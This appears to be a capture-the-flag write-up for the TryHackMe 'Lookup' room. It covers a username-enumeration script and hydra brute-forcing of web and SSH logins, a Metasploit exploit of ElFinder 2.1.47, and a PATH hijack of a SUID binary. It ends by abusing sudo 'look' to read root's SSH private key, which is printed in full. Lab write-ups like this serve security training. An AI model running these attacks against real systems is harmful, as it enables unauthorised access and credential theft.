
---
title: "Lookup"
draft: false
tags:
- cybersecurity
---

First thing, we enumerate the services of the machine

```bash
nmap 10.10.232.136
```

![](Pasted%20image%2020250221123243.png)

We se an http port so we try navigate in the browser
http://10.10.232.136

The browser sends us to http://lookup.thm, so we add this to `/etc/hosts`
```bash
sudo vi /etc/hosts
```

![[Pasted image 20250220185345.png]]


We find a login page
![[Pasted image 20250220185535.png]]

admin seems to be present as an user, but let's try find other ones with weaker passwords

I wrote a script in python to find a valid username using the response given by the server.

```python
import requests

url = 'http://lookup.thm/login.php'

linenumber = 1
found = False

with open('/usr/share/wordlists/names.txt') as topo_file:
    for line in topo_file:
        username = line.strip()
        myobj = {'username':username,'password':''}
        x = requests.post(url,myobj)
        print("Processing line " + str(linenumber) + " with value " + username)
        if("username" not in x.text and username != "admin"):
            print(x.text + " " + line)
            exit(1)
        linenumber += 1

```
![[Pasted image 20250220193320.png]]

Then we proceed to bruteforce the user `jose`
```bash
sudo hydra -l jose -P rockyou.txt.gz lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" -V

```

![[Pasted image 20250220223109.png]]


### ElFinder
After login we are redirected to `file.lookup.thm`, that we have to add to `/etc/hosts` as done before.
When we enter in the application we find a file system manager called **ElFinder**
Looking around we see in the info section that we are using the version 2.1.47
A quick search and we find that the version is exploitable, so we fire up **metasploit**
```bash
msfconsole
```

Inside we search for ElFinder
![[Pasted image 20250220223154.png]]

Let's try the number 4 using the command `use 4`
With `show options `we see that we have to set `RHOSTS`, but since we are connected to TryHackMe VPN we need to set `LHOST` too.
`set RHOSTS filse.lookup.thm`
`set LHOST tun0`

After `exploit` we are logged with a meterpreter shell.
To enter system shell we use command `shell` then to upgrade TTY
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
find / -perm -4000 -print 2> /dev/null
```

![[Pasted image 20250220225602.png]]

Running the suspicious `pwm`
```
[!] Running 'id' command to extract the username and user ID (UID)              
[!] ID: www-data                                                                
[-] File /home/www-data/.passwords not found 
```

We see that it is trying to run the id command. Let's make the `pwm` command run our `id` command instead

```bash
export PATH='/tmp:$PATH'
```

And in the `/tmp` directory we create an `id` program
```bash
#!/bin/bash

echo "uid=33(think) sgid=33(think) groups=£33(think)"
```

After this we can run `/usr/sbin/pwm` to obtain a list of passwords.

We use this list with `hydra`
```bash
sudo hydra -l think -P thinkPasswords lookup.thm ssh
```


![[Pasted image 20250221114445.png]]

josemario.AKA(think)

### Think
After gaining access via ssh, let's search for sudo programs
```bash
sudo -l
```

![[Pasted image 20250221114814.png]]

Let's find in https://gtfobins.github.io/ if `look` is prone to exploit

![[Pasted image 20250221114859.png]]
Ok, so let's `look` inside the `id_rsa` of `root` user to access the machine
```bash
sudo look '' "/root/.ssh/id_rsa"
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

```bash
ssh root@lookup.thm -i id_rsa_root
```